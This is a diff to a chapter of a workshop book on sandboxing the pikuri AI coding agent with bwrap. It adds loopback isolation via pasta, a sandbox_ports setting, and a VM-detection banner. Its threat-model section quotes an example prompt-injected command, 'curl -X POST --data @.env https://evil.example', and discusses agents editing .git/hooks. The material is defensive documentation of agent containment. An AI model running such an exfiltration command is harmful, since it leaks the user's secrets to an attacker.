@@ -33,6 +33,9 @@ pikuri's [first-conversation](https://codeberg.org/mvysny/pikuri/src/branch/mast
   `pikuri-code` fails loudly at boot if `bwrap` is missing or your kernel won't give it user
   namespaces, rather than quietly running without a cage. Skipping the cage is a flag you pass
   on purpose: `--no-sandbox`.
+- **`pasta`**, which gives the cage a loopback of its own (below). On Debian / Ubuntu:
+  `sudo apt install passt`; rootless podman already pulled it in. Without it the cage still
+  runs, and the banner tells you what that leaves open.
 - **Linux 5.11 or newer**, for one sandbox feature (overlays, below). Older kernels still work,
   with a logged warning and a narrower sandbox.
 - **A throwaway directory**, with `git init` in it so the agent treats it as a project:
@@ -189,6 +192,22 @@ Then it unshares every namespace except the network (`--unshare-all --share-net`
 command can't see or signal your processes, and dies with pikuri. Your home directory, apart
 from the toolchain directories listed above, simply isn't there. That's why `ls ~/.ssh` said
 *No such file or directory*: nothing blocked the read; there was nothing to read.
+
+### Loopback, walled too
+
+"Keeps the network" sounds like the internet, but a shared network namespace shares
+*loopback* too, and `127.0.0.1` is where a machine keeps the services that trust anyone local:
+a web server's admin API, `adb`, a database, the memory store from a later chapter. Probed from
+inside the cage on the box this book was written on, Caddy's admin API answered with its live
+configuration, and it takes a request that replaces it.
+
+So with `pasta` installed, `bwrap` runs inside a network namespace of its own, which `pasta`
+connects outward. The internet and your LAN work as before; `127.0.0.1` inside is the cage's
+own, so a server a command starts is reachable from that same command, and the host's are not.
+The `bash` tool's description tells the model so, so a refused `curl localhost:3000` doesn't
+read as a dead server. When the agent *should* test against a dev server you run on the host,
+name its port in the config file: `sandbox_ports: [3000]`. That is the same deal as
+`sandbox_env:`: closed by default, opened by name, by you.
 
 ### Overlays: writable toolchains that forget
 
@@ -382,11 +401,12 @@ the last section.
 
 Here is everything this setup does *not* protect:
 
-- **The network is open.** `--share-net` is there because builds need it: `git fetch`,
-  `bundle install`, `mvn`. Inside the cage, `curl https://example.com` gets its `200`. An
-  injected `curl -X POST --data @.env https://evil.example` is one approved command away, and
-  the prompt is the only thing in its path. A per-host allowlist (your registries and your git
-  remote, nothing else) is planned, not shipped.
+- **The network is open.** Builds need it: `git fetch`, `bundle install`, `mvn`. Inside the
+  cage, `curl https://example.com` gets its `200`. An injected
+  `curl -X POST --data @.env https://evil.example` is one approved command away, and the
+  prompt is the only thing in its path. Only the host's loopback is cut; your LAN, the LLM
+  server included, answers. A per-host allowlist (your registries and your git remote,
+  nothing else) is planned, not shipped.
 - **The project is inside the radius.** The agent can change anything under the project root:
   the build files, the tests, and `.git/hooks`, which run the next time *you* commit, outside
   any cage. And "leak *this* project's `.env`" works exactly as well as it would without a
@@ -414,8 +434,9 @@ own kernel, so the shared-kernel problem goes; the VM holds none of your other f
 blast radius is the VM; and you can throw it away afterwards. Inside one, `--yolo` is a
 reasonable way to work, and an unattended run (no human to answer prompts) belongs nowhere
 else. The workshop doesn't ship a VM: one cage that says plainly where it stops beats two, and
-a VM needs your whole toolchain inside it, which only you can set up. Nothing checks yet that
-you used one, either. That's on you, and it's why the banner says so.
+a VM needs your whole toolchain inside it, which only you can set up. Nothing stops you
+running without one, either; the banner asks `systemd-detect-virt`, and outside a VM it says so
+in red.
 
 ## What's next
 
